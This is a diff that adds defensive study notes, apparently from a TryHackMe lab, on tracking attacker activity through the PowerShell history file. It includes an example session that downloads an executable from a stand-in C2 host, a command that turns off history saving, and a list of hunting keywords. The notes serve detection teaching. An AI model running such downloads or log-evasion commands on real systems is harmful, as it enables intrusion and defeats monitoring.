@@ -296,3 +296,67 @@ Event ID 1 gives process context; these four events show what the process did ne
 - Splunk starting point (field names may differ in your data):
 
         index=windowslogs ProcessId=<id> EventID IN (3, 11, 13, 22) | table _time EventID Image TargetFilename DestinationIp QueryName
+
+---
+
+# PowerShell Logging: The History File
+
+PowerShell is trusted and capable of downloading malware, discovery, exfiltration, and injection, but Sysmon Event ID 1 only shows that `powershell.exe` launched, not the commands run inside it.
+
+## Why Process Logs Miss It
+
+- Most programs do one job, so new tasks mean new processes and new logs
+- `powershell.exe` is an all-in-one tool: hundreds of commands run in one session, one process
+- Result: a single Event ID 1, with no visibility into what was typed
+
+Example session (only one Event ID 1 would exist for all of it):
+
+    PS C:\> Get-ChildItem
+    PS C:\> Get-Content secrets.txt
+    PS C:\> Get-LocalUser; Get-LocalGroup
+    PS C:\> Invoke-WebRequest http://c2server.thm/a.exe -OutFile C:\Temp\a.exe
+
+| Command | Attacker action |
+|---|---|
+| `Get-ChildItem` | File discovery |
+| `Get-Content secrets.txt` | Reading a sensitive file |
+| `Get-LocalUser; Get-LocalGroup` | Account and group discovery |
+| `Invoke-WebRequest ... -OutFile` | Malware download to `C:\Temp` |
+
+## Monitoring Options
+
+- At least five methods exist, each with pros and cons
+- Others to research: AMSI, Transcript Logging ([Logless Hunt room](https://tryhackme.com/room/loglesshunt))
+- This note covers the simplest one: the history file
+
+## PowerShell History File
+
+    C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+- Plain text, created automatically by PowerShell
+- Records every command typed, updated as soon as you press Enter
+- One file per user (five users = up to five files)
+- Survives reboots unless manually deleted
+- Keeps commands for all time
+
+## Limitations
+
+- Does **not** log command output
+- Does **not** show script content (e.g. `powershell .\script.ps1` records only that line)
+
+## Detection Tips
+
+General knowledge, not in the lesson:
+
+- Attackers can delete the file or turn saving off (`Set-PSReadLineOption -HistorySaveStyle SaveNothing`), so a missing or empty file on a user who uses PowerShell is itself suspicious
+- It captures interactive console typing; commands passed on the command line (`-Command`, `-EncodedCommand`) land in Sysmon Event ID 1's `CommandLine` field instead, so check both
+- List every user's history file at once:
+
+        Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+- Show the current user's history path:
+
+        (Get-PSReadLineOption).HistorySavePath
+
+- Hunt the content for: `Invoke-WebRequest`, `DownloadString`, `-enc`, `IEX`, `net user`, `whoami`
+- Pair it with Sysmon Event ID 1 and 11: the history shows the download command, Sysmon shows the file it dropped
